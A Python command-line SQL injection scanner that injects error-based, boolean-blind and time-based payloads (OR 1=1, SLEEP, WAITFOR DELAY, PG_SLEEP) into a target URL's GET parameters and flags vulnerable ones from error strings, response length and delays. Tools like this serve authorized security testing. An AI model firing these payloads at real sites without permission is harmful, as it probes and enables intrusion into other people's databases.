import requests
import argparse
import sys
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Tool Banner
BANNER = f"""
{Fore.CYAN}
   _____ ____  __    _      ____ _               _
  / ____/ __ \/ /   | |    / ___| |             | |
 | (___| |  | \ \   | |   | |   | |__   ___  ___| | _____ _ __
  \___ \ |  | |> >  | |   | |   | '_ \ / _ \/ __| |/ / _ \ '__|
  ____) | |__| < <  | |___| |___| | | |  __/ (__|   <  __/ |
 |_____/\____/_/\_\ |______\____|_| |_|\___|\___|_|\_\___|_|
 
   {Fore.YELLOW}A Python-based SQL Injection Scanner{Style.RESET_ALL}
"""

# --- Payloads and Detection ---

# Payloads that might trigger a database error
ERROR_PAYLOADS = ["'", "\"", "`", "')", "\")", "`)", "||", "OR '1'='1", "OR 1=1"]

# Common database error messages
DB_ERRORS = [
    "sql syntax", "mysql", "unclosed quotation mark", "oracle", "microsoft",
    "invalid quer", "odbc", "ora-", "syntax error", "pg_query"
]

# Time-based blind SQLi payloads (sleep for 5 seconds)
TIME_PAYLOADS = [
    "OR IF(1=1, SLEEP(5), 0)",      # MySQL
    "' OR IF(1=1, SLEEP(5), 0)--",  # MySQL
    "'; IF(1=1) WAITFOR DELAY '0:0:5'--", # SQL Server
    "ORDER BY 1; WAITFOR DELAY '0:0:5'--", # SQL Server
    "OR 1=(SELECT 1 FROM PG_SLEEP(5))", # PostgreSQL
]

# User-Agent
HEADERS = {'User-Agent': 'SQLChecker/1.0'}

def print_banner():
    """Prints the tool's banner."""
    print(BANNER)

def scan_sql_injection(url):
    """
    Scans a given URL for various SQL injection vulnerabilities.
    """
    print(f"\n{Fore.YELLOW}[*] Starting scan on: {url}")
    
    # Parse the URL to manipulate parameters
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    
    if not params:
        print(f"{Fore.RED}[!] No GET parameters found in the URL. This scanner currently only tests GET parameters.")
        return

    # Make a baseline request to compare against
    try:
        base_res = requests.get(url, headers=HEADERS, timeout=10)
        base_len = len(base_res.text)
        print(f"{Fore.CYAN}[+] Baseline request length: {base_len} bytes")
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] Baseline request failed: {e}")
        return

    # --- Test 1: Error-Based SQLi ---
    print(f"\n{Fore.GREEN}[+] Testing for Error-Based SQLi...")
    is_vulnerable_error = False
    for payload in ERROR_PAYLOADS:
        # Inject payload into each parameter
        for param in params:
            original_value = params[param][0]
            params[param][0] = original_value + payload
            
            # Reconstruct the URL with the payload
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))
            
            try:
                res = requests.get(test_url, headers=HEADERS, timeout=10)
                for error in DB_ERRORS:
                    if error.lower() in res.text.lower():
                        print(f"{Fore.RED}[!] VULNERABLE (Error-Based) found!")
                        print(f"  {Fore.WHITE}URL: {test_url}")
                        print(f"  {Fore.WHITE}Reason: Found error message '{error}' in response.")
                        is_vulnerable_error = True
                        break
            except requests.RequestException:
                pass
            
            # Reset parameter for next test
            params[param][0] = original_value
            if is_vulnerable_error: break
        if is_vulnerable_error: break
    
    if not is_vulnerable_error:
        print(f"{Fore.GREEN}[-] No obvious error-based SQLi found.")

    # --- Test 2: Boolean-Based Blind SQLi ---
    print(f"\n{Fore.GREEN}[+] Testing for Boolean-Based Blind SQLi...")
    is_vulnerable_bool = False
    true_payload = "' OR '1'='1" # Using a more reliable payload
    false_payload = "' OR '1'='2"
    for param in params:
        original_value = params[param][0]
        
        # Test TRUE condition
        params[param][0] = original_value + true_payload
        true_query = urlencode(params, doseq=True)
        true_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, true_query, parsed_url.fragment))
        
        # Test FALSE condition
        params[param][0] = original_value + false_payload
        false_query = urlencode(params, doseq=True)
        false_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, false_query, parsed_url.fragment))

        try:
            true_res = requests.get(true_url, headers=HEADERS, timeout=10)
            false_res = requests.get(false_url, headers=HEADERS, timeout=10)
            
            len_true = len(true_res.text)
            len_false = len(false_res.text)

            if len_true != base_len and len_true != len_false:
                print(f"{Fore.RED}[!] VULNERABLE (Boolean-Based) likely found!")
                print(f"  {Fore.WHITE}Parameter: {param}")
                print(f"  {Fore.WHITE}Reason: Content length differs on TRUE/FALSE conditions.")
                print(f"    - Original Length: {base_len}")
                print(f"    - TRUE Payload Length: {len_true}")
                print(f"    - FALSE Payload Length: {len_false}")
                is_vulnerable_bool = True
                break
        except requests.RequestException:
            pass

        # Reset parameter
        params[param][0] = original_value
    
    if not is_vulnerable_bool:
        print(f"{Fore.GREEN}[-] No boolean-based blind SQLi found.")

    # --- Test 3: Time-Based Blind SQLi ---
    print(f"\n{Fore.GREEN}[+] Testing for Time-Based Blind SQLi (this will take a moment)...")
    is_vulnerable_time = False
    for payload in TIME_PAYLOADS:
        for param in params:
            original_value = params[param][0]
            params[param][0] = original_value + payload
            test_query = urlencode(params, doseq=True)
            test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, test_query, parsed_url.fragment))
            
            try:
                start_time = time.time()
                # Use a longer timeout for time-based tests
                requests.get(test_url, headers=HEADERS, timeout=15)
                end_time = time.time()
                
                if (end_time - start_time) > 5: # 5 seconds is our sleep time
                    print(f"{Fore.RED}[!] VULNERABLE (Time-Based) found!")
                    print(f"  {Fore.WHITE}URL: {test_url}")
                    print(f"  {Fore.WHITE}Reason: Server response delayed, indicating command execution.")
                    is_vulnerable_time = True
                    break
            except requests.Timeout:
                print(f"{Fore.RED}[!] VULNERABLE (Time-Based) found!")
                print(f"  {Fore.WHITE}URL: {test_url}")
                print(f"  {Fore.WHITE}Reason: Server timed out, indicating successful sleep command.")
                is_vulnerable_time = True
                break
            except requests.RequestException:
                pass
            
            params[param][0] = original_value
            if is_vulnerable_time: break
        if is_vulnerable_time: break
        
    if not is_vulnerable_time:
        print(f"{Fore.GREEN}[-] No time-based blind SQLi found.")

    print(f"\n{Fore.YELLOW}[*] Scan finished.")

def main():
    """Main function to parse arguments and start the scan."""
    print_banner()
    parser = argparse.ArgumentParser(
        description="A Python-based scanner to test for basic SQL injection vulnerabilities."
    )
    parser.add_argument("url", help="The target URL to test, including GET parameters (e.g., 'http://test.com/index.php?id=1').")
    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
        
    args = parser.parse_args()
    scan_sql_injection(args.url)

if __name__ == "__main__":
    main()
